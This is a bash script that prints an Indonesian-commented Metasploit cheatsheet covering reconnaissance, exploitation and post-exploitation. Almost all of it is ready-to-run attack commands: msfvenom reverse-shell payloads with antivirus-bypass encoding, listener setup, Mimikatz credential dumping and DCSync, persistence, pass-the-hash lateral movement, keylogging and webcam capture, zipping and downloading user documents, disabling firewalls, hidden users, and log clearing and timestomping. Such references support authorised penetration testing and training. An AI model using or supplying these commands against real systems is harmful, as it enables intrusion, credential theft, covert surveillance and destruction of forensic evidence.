#!/usr/bin/env bash
#===============================================================================
#  Metasploit Quick Reference Cheatsheet
#  Usage:
#    bash msf-cheatsheet.sh          → Tampilkan semua contekan
#    source msf-cheatsheet.sh        → Definisikan fungsi untuk dipanggil
#===============================================================================
set -euo pipefail

# ── Colors (self-contained, bisa di-override oleh script pemanggil) ────────────
: "${RED:=\033[0;31m}"
: "${GREEN:=\033[0;32m}"
: "${YELLOW:=\033[1;33m}"
: "${BLUE:=\033[0;34m}"
: "${MAGENTA:=\033[0;35m}"
: "${CYAN:=\033[0;36m}"
: "${BOLD:=\033[1m}"
: "${DIM:=\033[2m}"
: "${NC:=\033[0m}"

#==============================================================================
# GENERAL METASPLOIT CHEATSHEET
#==============================================================================
show_cheatsheet() {
    cat << 'CHEAT'

════════════════════════════════════════════════════════════════════════
                    METASPLOIT QUICK REFERENCE
════════════════════════════════════════════════════════════════════════

🔍 RECONNAISSANCE (Pengintaian)
────────────────────────────────
DB & Workspace:
  db_status                          # Cek database
  workspace -a project_name          # Buat workspace
  workspace project_name             # Pindah workspace
  hosts                              # List hosts
  services                           # List services
  vulns                              # List vulnerabilities

Nmap inside msfconsole:
  db_nmap -sS -T4 192.168.1.0/24     # Quick scan + import ke DB
  db_nmap -p- -sV -O target          # Full scan
  db_nmap --script vuln target       # Vuln scan

Import external:
  db_import nmap_output.xml          # Import nmap XML
  db_import nessus.nessus            # Import Nessus

Search modules:
  search portscan                    # Port scanner modules
  search scanner/smb                 # SMB scanners
  search scanner/ssh                 # SSH scanners

⚔️ EXPLOITATION (Eksploitasi)
────────────────────────────────
Basic flow:
  search <keyword>                   # Cari exploit
  use exploit/path/to/module         # Pilih exploit
  show options                       # Lihat opsi
  set RHOSTS 192.168.1.100           # Set target
  set LHOST 192.168.1.50             # Set attacker IP
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  exploit                            # Jalankan
  exploit -z                         # Jalankan background

Common exploits:
  exploit/windows/smb/ms17_010_eternalblue
  exploit/windows/rdp/cve_2019_0708_bluekeep_rce
  exploit/windows/smb/ms08_067_netapi
  exploit/linux/ssh/ssh_login        # Brute force
  exploit/multi/http/php_cgi_arg_injection
  exploit/unix/ftp/vsftpd_234_backdoor

Payloads:
  windows/x64/meterpreter/reverse_tcp
  windows/x64/meterpreter/reverse_https
  linux/x64/meterpreter/reverse_tcp
  android/meterpreter/reverse_tcp
  php/meterpreter/reverse_tcp
  java/meterpreter/reverse_tcp
  cmd/unix/reverse_python

Handler (listener):
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT 4444
  exploit -j                         # Run as job

🎯 POST-EXPLOITATION (Pasca-Eksploitasi)
────────────────────────────────────────
Meterpreter core:
  sysinfo                            # System info
  getuid                             # Current user
  getsystem                          # Privilege escalation (SYSTEM)
  hashdump                           # Dump SAM hashes
  shell                              # Drop ke cmd.exe
  migrate <PID>                       # Migrate process

Post modules (run post/...):
  post/windows/gather/enum_applications
  post/windows/gather/enum_logged_on_users
  post/windows/gather/hashdump
  post/windows/gather/credential_collector
  post/windows/manage/migrate
  post/windows/manage/enable_rdp
  post/multi/recon/local_exploit_suggester
  post/multi/manage/autoroute
  post/multi/gather/ping_sweep

Kiwi / Mimikatz:
  load kiwi
  creds_all                          # All credentials
  lsa_dump_sam                       # SAM
  lsa_dump_secrets                   # LSA secrets
  dcsync                             # Domain controller sync (if DA)

Pivoting:
  run autoroute -s 10.0.0.0/24       # Add route
  run autoroute -p                   # Print routes
  use auxiliary/server/socks_proxy   # SOCKS4a proxy
  set SRVHOST 0.0.0.0
  set SRVPORT 1080
  exploit -j
  # Lalu: proxychains nmap -sT 10.0.0.5

Persistence:
  run persistence -X -i 60 -p windows/x64/meterpreter/reverse_tcp -r LHOST
  use exploit/windows/local/registry_persistence
  use exploit/windows/local/service_persistence

📱 MSFVENOM QUICK REFERENCE
────────────────────────────────────────
Windows:
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o shell.exe

Linux:
  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

Android:
  msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o shell.apk

Web:
  msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp

Encoding (bypass AV):
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o shell_encoded.exe

CHEAT
}

#==============================================================================
# POST-EXPLOITATION FULL CHEATSHEET
#==============================================================================
show_postexploit_cheatsheet() {
    cat << 'POSTCHEAT'

════════════════════════════════════════════════════════════════════════
          POST-EXPLOITATION FULL REFERENCE — METERPRETER + MODULES
════════════════════════════════════════════════════════════════════════

🎯 METERPRETER CORE COMMANDS
────────────────────────────────
  ? / help                           # Meterpreter help menu
  sysinfo                            # System info (OS, arch, hostname)
  getuid                             # Current user
  getprivs                           # Current privileges
  getsystem                          # Auto privilege escalation → SYSTEM
  ps                                 # Process list
  migrate <PID>                       # Migrate ke process lain (stability)
  kill <PID>                          # Kill process
  shell                              # Drop ke system shell (cmd.exe / /bin/sh)
  background                         # Background session (return ke msfconsole)
  sessions -l                        # List all sessions dari msfconsole
  sessions -i <N>                    # Interact dengan session N
  sessions -k <N>                    # Kill session N
  sessions -u <N>                    # Upgrade shell ke meterpreter

📡 NETWORK & DISCOVERY
────────────────────────────────
  ipconfig                           # IP interfaces
  route                              # Routing table
  netstat                            # Network connections
  arp                                # ARP table
  getproxy                           # Proxy config
  run post/windows/gather/arp_scanner RHOSTS=192.168.1.0/24
  run post/windows/gather/enum_ad_computers
  run post/windows/gather/enum_domains
  run post/windows/gather/enum_domain_users
  run post/windows/gather/enum_domain_groups
  run post/multi/gather/ping_sweep RHOSTS=192.168.10.0/24
  run post/windows/gather/enum_network
  run post/windows/gather/enum_shares

🔐 PRIVILEGE ESCALATION (WINDOWS)
────────────────────────────────────
  # Auto local exploit suggester:
  run post/multi/recon/local_exploit_suggester

  # getsystem (built-in, 3 techniques):
  getsystem                          # Technique 0: Named pipe impersonation
  getsystem -t 1                     # Technique 1: Token duplication
  getsystem -t 2                     # Technique 2: Administrator → SYSTEM

  # UAC Bypass modules:
  use exploit/windows/local/bypassuac_eventvwr
  use exploit/windows/local/bypassuac_comhijack
  use exploit/windows/local/bypassuac_fodhelper
  use exploit/windows/local/bypassuac_sdclt

  # Token manipulation:
  use exploit/windows/local/token_duplication
  use exploit/windows/local/ms16_032_secondary_logon_handle
  use exploit/windows/local/always_install_elevated

  # Service-based:
  use exploit/windows/local/service_permissions

  # DLL hijacking:
  use exploit/windows/local/dll_hijacking

🔐 PRIVILEGE ESCALATION (LINUX)
────────────────────────────────────
  run post/multi/recon/local_exploit_suggester
  use exploit/linux/local/dirty_cow           # CVE-2016-5195
  use exploit/linux/local/pkexec              # CVE-2021-4034 (PwnKit)
  use exploit/linux/local/netfilter_priv_esc_ipv4  # CVE-2023-...
  use exploit/linux/local/sudo_baron_samedit  # CVE-2021-3156
  use exploit/linux/local/glibc_origin_expansion_priv_esc
  use exploit/linux/local/cve_2022_0847_dirtypipe

🔑 CREDENTIAL HARVESTING (WINDOWS — KIWI/MIMIKATZ)
────────────────────────────────────────────────────
  load kiwi                           # Load mimikatz extension
  help kiwi                           # Kiwi command list
  creds_all                           # Dump ALL credentials
  creds_msv                           # LM/NTLM hashes (MSV)
  creds_kerberos                      # Kerberos tickets
  creds_livessp                       # LiveSSP credentials
  creds_ssp                           # SSP credentials
  creds_tspkg                         # TSPKG credentials
  creds_wdigest                       # WDigest credentials
  lsa_dump_sam                        # SAM database dump
  lsa_dump_secrets                    # LSA secrets
  lsa_dump_cache                      # Domain cached credentials
  dcsync                              # DCSync attack (needs DA)
  dcsync_ntlm <user>                 # DCSync specific user
  golden_ticket_create                # Golden Ticket (needs krbtgt hash)
  silver_ticket_create                # Silver Ticket
  kerberos_ticket_list                # List Kerberos tickets
  kerberos_ticket_use <path>          # Pass the Ticket
  kerberos_ticket_purge               # Purge tickets
  password_change                     # Change user password
  hashdump                            # Dump SAM hashes (built-in)

🔑 CREDENTIAL HARVESTING (POST MODULES)
─────────────────────────────────────────
  # Windows:
  run post/windows/gather/hashdump
  run post/windows/gather/credentials/credential_collector
  run post/windows/gather/enum_chrome
  run post/windows/gather/enum_firefox
  run post/windows/gather/enum_ie
  run post/windows/gather/wifi_profiles_passwords
  run post/windows/gather/enum_putty
  run post/windows/gather/enum_citrix
  run post/windows/gather/enum_outlook
  run post/windows/gather/enum_skype
  run post/windows/gather/enum_teams
  run post/windows/gather/enum_vnc
  run post/windows/gather/enum_ftp
  run post/windows/gather/enum_rdp

  # Linux:
  run post/linux/gather/hashdump
  run post/linux/gather/enum_users_history
  run post/linux/gather/enum_configs
  run post/linux/gather/checkvm
  run post/linux/gather/enum_network
  run post/multi/gather/ssh_creds

🔒 PERSISTENCE (WINDOWS)
────────────────────────────────
  # Registry Run Key:
  run persistence -X -i 60 -p windows/x64/meterpreter/reverse_tcp -r LHOST
  run persistence -X -S -i 60 -p windows/x64/meterpreter/reverse_tcp -r LHOST
  # -X = auto-start on boot, -S = install as SYSTEM, -i = callback interval (seconds)

  # Service:
  use exploit/windows/local/service_persistence
  set SESSION <N>; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <IP>; exploit

  # Scheduled Task:
  use exploit/windows/local/scheduled_task_persistence
  set SESSION <N>; exploit

  # WMI (Fileless):
  use exploit/windows/local/wmi_persistence
  set SESSION <N>; exploit

  # COM Hijacking:
  use exploit/windows/local/com_hijacking
  set SESSION <N>; exploit

  # Registry Key:
  use exploit/windows/local/registry_persistence
  set SESSION <N>; exploit

  # RDP Enable:
  run post/windows/manage/enable_rdp

  # Sticky Keys backdoor:
  use post/windows/manage/sticky_keys

🔒 PERSISTENCE (LINUX)
─────────────────────────
  run post/linux/manage/sshkey_persistence
  use exploit/linux/local/cron_persistence
  set SESSION <N>; exploit
  use exploit/linux/local/systemd_persistence
  set SESSION <N>; exploit

🔀 LATERAL MOVEMENT & PIVOTING
──────────────────────────────────
  # Pivoting (routing melalui session):
  run autoroute -s 192.168.10.0/24     # Add subnet route
  run autoroute -s 10.0.0.0/8          # Add larger route
  run autoroute -p                     # Print routing table

  # SOCKS Proxy:
  use auxiliary/server/socks_proxy
  set SRVHOST 0.0.0.0; set SRVPORT 1080; set VERSION 5
  run
  # Lalu: proxychains nmap -sT -Pn 192.168.10.50

  # Port Forward (meterpreter):
  portfwd add -l 3389 -p 3389 -r 192.168.10.50
  portfwd list
  portfwd delete -l 3389

  # PsExec (SMB):
  use exploit/windows/smb/psexec
  set RHOSTS <target>; set SMBUser <user>; set SMBPass <pass/hash>
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  exploit

  # PsExec via PowerShell:
  use exploit/windows/smb/psexec_psh
  set RHOSTS <target>; set SMBUser <user>; set SMBPass <pass/hash>
  exploit

  # WMI Exec:
  use exploit/windows/wmi/wmi_exec
  set RHOSTS <target>; set SMBUser <user>; set SMBPass <pass/hash>
  exploit

  # Pass the Hash:
  use exploit/windows/smb/psexec
  set RHOSTS <target>; set SMBUser administrator
  set SMBPass aad3b435b51404eeaad3b435b51404ee:<NTLM_hash>
  set SMBDomain .
  exploit

  # RDP Hijacking:
  run post/windows/manage/rdp_hijack

📦 DATA EXFILTRATION
────────────────────────
  screenshot                          # Capture desktop screenshot
  screenshare                         # Real-time screen streaming
  keyscan_start                       # Start keylogger
  keyscan_dump                        # Dump captured keystrokes
  keyscan_stop                        # Stop keylogger
  download <remote_path> <local_path> # Download file
  upload <local_path> <remote_path>   # Upload file
  search -f "*.pdf" -d "C:\\Users"    # Search files recursively
  search -f "*.doc*" -d "C:\\"
  search -f "password*" -d "C:\\"
  search -f "*.kdbx" -d "C:\\Users"   # KeePass databases
  search -f "*.pst" -d "C:\\"         # Outlook PST files
  record_mic -d 30                    # Record microphone (30 detik)
  webcam_snap                         # Snapshot webcam
  webcam_list                         # List webcams
  webcam_stream                       # Stream webcam
  get_clipboard                       # Clipboard content
  execute -f cmd.exe -a "/c zip -r C:\\Temp\\exfil.zip C:\\Users\\Admin\\Documents"
  download "C:\\Temp\\exfil.zip" /tmp/

🗑️ CLEANUP & ANTI-FORENSICS
──────────────────────────────
  clearev                             # Clear Windows event logs (all)
  timestomp <file> -v <ref_file>     # Clone timestamp dari file referensi
  timestomp <file> -m                 # Modified time only
  timestomp <file> -a                 # Accessed time only
  timestomp <file> -c                 # Created time only
  timestomp <file> -e                 # Entry modified time only
  run post/windows/manage/cleanup     # Comprehensive cleanup
  run post/windows/manage/cleanup_logs
  run post/windows/manage/sdelete     # Secure delete
  run post/windows/manage/delete_scheduled_task
  run post/windows/manage/delete_service
  run post/windows/manage/delete_registry_key
  run post/windows/manage/delete_file
  rm <file>                           # Delete file via meterpreter

🛡️ DEFENSE EVASION
───────────────────────
  # Process migration (hindari AV):
  ps                                  # Cari process stabil
  migrate <PID>                       # explorer.exe, svchost.exe, lsass.exe

  # Process injection:
  use post/windows/manage/migrate     # Auto-migrate module
  use post/windows/manage/process_migrate

  # Disable firewall:
  execute -f cmd.exe -a "/c netsh advfirewall set allprofiles state off"

  # Modify firewall rules:
  execute -f cmd.exe -a "/c netsh advfirewall firewall add rule name=\"svchost\" dir=in action=allow program=\"C:\\Windows\\temp\\backdoor.exe\" enable=yes"

  # Hidden user:
  run post/windows/manage/add_user
  run post/windows/manage/hidden_user

  # Timestomp whole directory:
  execute -f cmd.exe -a "/c for %f in (C:\\temp\\*.*) do @copy /b C:\\Windows\\System32\\kernel32.dll+,%f %f"

🔧 SYSTEM MANIPULATION
──────────────────────────
  # Registry:
  reg                               # Registry interaction
  reg enumkey -k HKLM\\Software
  reg setval -k HKLM\\Software\\Backdoor -v Status -d "active"
  reg queryval -k HKLM\\Software\\Backdoor -v Status

  # File System:
  cat <file>                          # Read file
  edit <file>                         # Edit file (vim-style)
  mkdir <dir>                         # Create directory
  rmdir <dir>                         # Remove directory
  mv <src> <dst>                      # Move/rename
  cp <src> <dst>                      # Copy
  chmod <mode> <file>                 # Change permissions

  # User Management:
  run post/windows/manage/add_user
  run post/windows/manage/enable_rdp
  run post/windows/manage/disable_rdp

  # Service & Task:
  run post/windows/manage/service_control
  run post/windows/manage/scheduled_task

🐚 SHELL TYPES (UPGRADE)
────────────────────────────
  # Upgrade shell ke meterpreter:
  sessions -u <N>                    # Upgrade spawn shell ke meterpreter

  # Background existing session & spawn new:
  background
  use post/multi/manage/shell_to_meterpreter
  set SESSION <N>
  run

  # Multi-handler listener (untuk catch upgrade):
  use exploit/multi/handler
  set PAYLOAD windows/x64/meterpreter/reverse_tcp
  set LHOST <IP>; set LPORT <PORT>
  exploit -j

📊 POST MODULES BY CATEGORY
──────────────────────────────
  post/windows/gather/*              # Information gathering
  post/windows/manage/*              # System management
  post/windows/escalate/*            # Privilege escalation
  post/windows/capture/*             # Credential capture
  post/windows/recon/*               # Reconnaissance
  post/linux/gather/*                # Linux info gathering
  post/linux/manage/*                # Linux system management
  post/multi/gather/*                # Multi-platform gathering
  post/multi/manage/*                # Multi-platform management
  post/multi/recon/*                 # Multi-platform recon

POSTCHEAT
}

#==============================================================================
# STANDALONE EXECUTION — tampilkan semua contekan jika dijalankan langsung
#==============================================================================
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo -e "${RED}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════════╗"
    echo "  ║     METASPLOIT QUICK REFERENCE — CHEATSHEET          ║"
    echo "  ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    show_cheatsheet
    echo ""
    echo -e "${RED}${BOLD}"
    echo "  ╔══════════════════════════════════════════════════════╗"
    echo "  ║     POST-EXPLOITATION FULL REFERENCE                 ║"
    echo "  ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    show_postexploit_cheatsheet
fi